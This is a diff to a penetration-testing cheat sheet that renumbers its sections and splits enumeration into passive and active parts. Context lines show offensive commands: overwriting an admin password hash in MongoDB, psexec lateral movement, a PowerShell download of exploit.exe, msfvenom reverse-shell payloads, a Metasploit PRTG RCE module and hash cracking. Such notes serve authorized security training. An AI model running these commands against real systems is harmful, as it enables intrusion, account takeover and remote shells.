@@ -2,26 +2,24 @@
 
 Overview
 ---------
-1. - [Enumeration](#1---enumeration)
-2. - [Exploitation](#2---exploitation)
-3. - [Lateral Movement](#3---lateral-movement)
-4. - [Privilege Escalation](#4---privilege-escalation)
-5. - [Brute Force](#5---brute-force)
-6. - [File Transfers](#6---file-transfers)
-7. - [Restricted Shell Escapes](#7---restricted-shell-escapes)
-8. - [Reverse Shells](#8---reverse-shells)
-9. - [Online Resources](#9---online-resources)
-10. - [Browser Plugins](#10---browser-plugins)
-11. - [Exploits](#11---exploits)
-     
-#1. - Enumeration
+1. - [Passive Enumeration](#1---passive-enumeration)
+2. - [Active Enumeration](#2---active-enumeration)
+3. - [Exploitation](#3---exploitation)
+4. - [Lateral Movement](#4---lateral-movement)
+5. - [Privilege Escalation](#5---privilege-escalation)
+6. - [Brute Force](#6---brute-force)
+7. - [File Transfers](#7---file-transfers)
+8. - [Restricted Shell Escapes](#8---restricted-shell-escapes)
+9. - [Reverse Shells](#9---reverse-shells)
+10. - [Online Resources](#10---online-resources)
+11. - [Browser Plugins](#11---browser-plugins)
+12. - [Exploits](#12---exploits)
+   
+#1. - Passive Enumeration
 -----------------------------------------
-
-- OSINT
-
-```
-https://searchcode.com/
-```
+     
+#2. - Active Enumeration
+-----------------------------------------
 
 - Nmap
 
@@ -212,7 +210,7 @@ $ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 $ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<Object ID>")},{$set:{"x_shadow":"<SHA-512 hash>"}})'
 ```
 
-#2. - Exploitation
+#3. - Exploitation
 -----------------------------------------
 
 - Local File Inclusion (LFI)
@@ -278,7 +276,7 @@ https://github.com/shk0x/PRTG-Network-Monitor-RCE/blob/master/prtg-exploit.sh
 use exploit/windows/http/prtg_authenticated_rce
 ```
 
-#3. - Lateral Movement
+#4. - Lateral Movement
 -----------------------------------------
 
 - Local Port Forwarding
@@ -327,7 +325,7 @@ $ python psexec.py <username>:<password>@<IP address>
 $ python psexec.py <username>@<IP address>
 ```
 
-#4. - Privilege Escalation
+#5. - Privilege Escalation
 -----------------------------------------
 
 - Sudo
@@ -409,7 +407,7 @@ $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo wi
 msf> use post/multi/recon/local_exploit_suggester
 ```
 
-#5. - Brute Force
+#6. - Brute Force
 -----------------------------------------
 
 - HashID
@@ -443,7 +441,7 @@ $ zip2john <ZIP file> > hashes.txt
 $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 ```
 
-#6. - File Transfers
+#7. - File Transfers
 -----------------------------------------
 
 - Host Files
@@ -465,7 +463,7 @@ C:\> copy \\<IP address>\a\whoami.exe C:\Windows\Temp\whoami.exe
 C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Offsec\Desktop\new-exploit.exe')"
 ```
 
-#7. - Restricted Shell Escapes
+#8. - Restricted Shell Escapes
 -----------------------------------------
 
 - Shell Escapes
@@ -488,7 +486,7 @@ $ reset
 $ export TERM=xterm-256color
 ```
 
-#8. - Reverse Shells
+#9. - Reverse Shells
 -----------------------------------------
 
 - Reverse Shells
@@ -520,7 +518,7 @@ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war 
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
 ```
 
-#9 - Online Resources
+#10. - Online Resources
 -----------------------------------------
 
 - Speedguide
@@ -547,7 +545,7 @@ https://lolbas-project.github.io/
 https://gtfobins.github.io/
 ```
 
-#10 - Browser Plugins
+#11. - Browser Plugins
 -----------------------------------------
 
 - Wappalyzer: Website technology analyser
@@ -568,7 +566,7 @@ https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 ```
 
-#11 - Exploits
+#12. - Exploits
 -----------------------------------------
 
 - MS17-010
